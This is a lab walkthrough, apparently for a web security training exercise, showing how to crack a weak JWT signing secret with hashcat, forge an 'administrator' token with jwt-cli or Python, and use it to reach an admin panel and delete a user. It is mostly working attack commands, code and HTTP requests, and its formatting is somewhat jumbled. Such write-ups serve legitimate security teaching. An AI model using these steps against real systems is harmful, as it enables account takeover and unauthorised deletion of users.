## JWT Authentication Bypass via Weak Signing Key

This lab demonstrates how an attacker can exploit a weak secret used to sign JWTs. If the signing key is weak or predictable, it can be brute-forced, allowing an attacker to forge a valid token and impersonate other users — such as the administrator.

### Steps to Reproduce

#### Part 1 - Brute-force the Secret Key

1. **Install JWT Editor extension in Burp Suite**  
   Load it from the BApp Store.

2. **Log in with the provided credentials: wiener: peter
3. 3. **Capture the JWT session token**  
In **Burp > Proxy > HTTP History**, find the `GET /my-account` request after login. Send it to **Repeater**.

4. **Try accessing admin panel**  
In Repeater, change the request path to `/admin`. It should return an unauthorized error.

5. **Copy the JWT token for brute-forcing**  
Use `hashcat` or any other tool to brute-force the secret.

```bash
hashcat -a 0 -m 16500 <JWT> /path/to/wordlist_to_crack
```
### P– Modify and Re-sign the JWT (in code)

```bash
# Step 1: Create a new JWT payload with "sub": "administrator"
# Save this payload as payload.json
```

echo '{"sub":"administrator"}' > payload.json
# Step 2: Re-sign the JWT using the discovered secret key
# You can use jwt.io manually OR sign via a tool like jwt-tool, jwt-cli, or a simple Python script

# Using jwt-cli (https://github.com/mike-engel/jwt-cli)
jwt sign payload.json --secret 'secret1' --alg HS256

# Alternatively, use Python to re-sign manually
import jwt
payload = {'sub': 'administrator'}
secret = 'secret1'
token = jwt.encode(payload, secret, algorithm='HS256')
print(token)
# Step 3: Replace the original session token in Burp with the new signed JWT
# Paste it into the Cookie header like:
# Cookie: session=<your_forged_jwt>
# Step 4: Send the forged request to /admin
GET /admin HTTP/1.1
Host: <target>
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0.vJfz3lZH9nZOf_s6tfbT_A2kbHK7SOM7FZ3R61z_ly0
# Step 5: After accessing /admin, find and request the deletion endpoint
# Example:
GET /admin/delete?username=carlos HTTP/1.1
Host: <target>
Cookie: session=<your_forged_jwt>
